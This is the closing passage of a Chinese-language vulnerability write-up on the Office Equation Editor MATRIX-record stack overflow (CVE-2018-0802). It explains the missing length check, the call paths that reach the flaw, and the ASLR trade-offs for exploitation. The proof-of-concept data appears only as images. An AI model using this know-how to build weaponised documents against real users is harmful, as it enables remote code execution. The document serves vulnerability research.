[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0104b225c9c2b243e8.png)

图24

[![](https://p0.ssl.qhimg.com/t01be28a9556f0b3aed.png)](https://p0.ssl.qhimg.com/t01be28a9556f0b3aed.png)

图25

显然，0x05代表了MATRIX record。所以我上面从SIZE record入手，通过逆向调试奔着sub_443e34函数而去，试错的过程中无意间构造出一个MATRIX record，并在不清楚这是一个MATRIX record的情况下一步一步构造出了exp。

过程和结果没错，但入口点错了，错的原因是因为checkpoint的文章里面说这个漏洞是SIZE record导致的。



## 修正后的数据结构和逻辑

漏洞在文件格式上的根本原因找到后，我可以更理智地来看一下数据结构了。现在让我重新审视一下构造的数据，对照上面MATRIX record的结构说明，之前的数据在现在看来是图26这样的。虽然和格式规范仍然存在一个字节的缺失(可以看到按照格式规范，rows字段之前需要读入4个字节，不过粗看注释貌似nudge字段可选)，但已经基本能对上了。看来这第三个漏洞的根本原因是：在解析MATRIX record时，对rows于cols字段没有进行正确的长度校验，导致可以构造恶意数据，在拷贝时造成栈溢出。

[![](https://p4.ssl.qhimg.com/t016fca87ae221893df.png)](https://p4.ssl.qhimg.com/t016fca87ae221893df.png)

图26

从错误的道路上回来后，再来检查一下之前的case 4例程到底是什么？现在很容易就写出如下注释(图27)，很明显sub_43a78f是对tag的一个派发函数：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a4c2c12f954a2816.png)

图27

通过之前的分析，已经知道对sub_43a78f的交叉引用有5处(图7)，所以，理论上所有调用sub_43a78f的函数(sub_437c9d)及它们上级函数，只要传入合适的MATRIX数据，全都可以触发CVE-2018-0802-Matrix漏洞。在sub_43755c函数中，有两处对sub_437c9d函数的调用。其中一处位于case 4内(对应 tag 4 PILE record)(参见图9)，另一处位于case 1内(对应tag 1 LINE record)(图28)。

[![](https://p4.ssl.qhimg.com/t0153830cf2b5811b03.png)](https://p4.ssl.qhimg.com/t0153830cf2b5811b03.png)

图28

所以，触发本次matrix漏洞的其中两个比较精简的poc可以构造为如下(图29)(分别以line record作为切入点pile record作为入口点，后面紧随触发漏洞的Matrix record数据)。

[![](https://p2.ssl.qhimg.com/t01f8f68f8f11500e99.png)](https://p2.ssl.qhimg.com/t01f8f68f8f11500e99.png)

图29

最后，总结一下到目前为止公式编辑器内3个漏洞的分布情况(图30)(CVE-2018-0802-matrix的触发流应该还有其他情况，下图只画出两种)：

[![](https://p4.ssl.qhimg.com/t01b1ac31891f3abfbd.png)](https://p4.ssl.qhimg.com/t01b1ac31891f3abfbd.png)

图30



## 总结

这个matrix record解析栈溢出一直存在在公式编辑器中，无论是打11月补丁前还是打11月补丁后都可以成功触发，在不需要Bypass ASLR的时候，使用起来还是很稳定的。在ASLR存在的情况下，如果靠内嵌多个ole暴力破解ASLR，并不是一种稳定的利用方法，这一点不如CVE-2018-0802-font漏洞。当然，如果可以结合这个Matrix溢出和CVE-2018-0802-font用到的2字节bypass ASLR的方法，或许会有新的思路出现，我并没有对此做深入研究。

本文仅用于漏洞交流，请勿用于非法用途。

## 参考链接

[https://www.anquanke.com/post/id/87311](https://www.anquanke.com/post/id/87311)

[https://www.anquanke.com/post/id/94210](https://www.anquanke.com/post/id/94210)

[http://rtf2latex2e.sourceforge.net/MTEF3.html](http://rtf2latex2e.sourceforge.net/MTEF3.html)

[http://ith4cker.com/content/uploadfile/201801/bd671515949243.pdf](http://ith4cker.com/content/uploadfile/201801/bd671515949243.pdf)

[https://research.checkpoint.com/another-office-equation-rce-vulnerability](https://research.checkpoint.com/another-office-equation-rce-vulnerability)

[https://sites.google.com/site/zerodayresearch/Analysis_of_the_Attack_Surface_of_Microsoft_Office_from_User_Perspective_final.pdf](https://sites.google.com/site/zerodayresearch/Analysis_of_the_Attack_Surface_of_Microsoft_Office_from_User_Perspective_final.pdf)
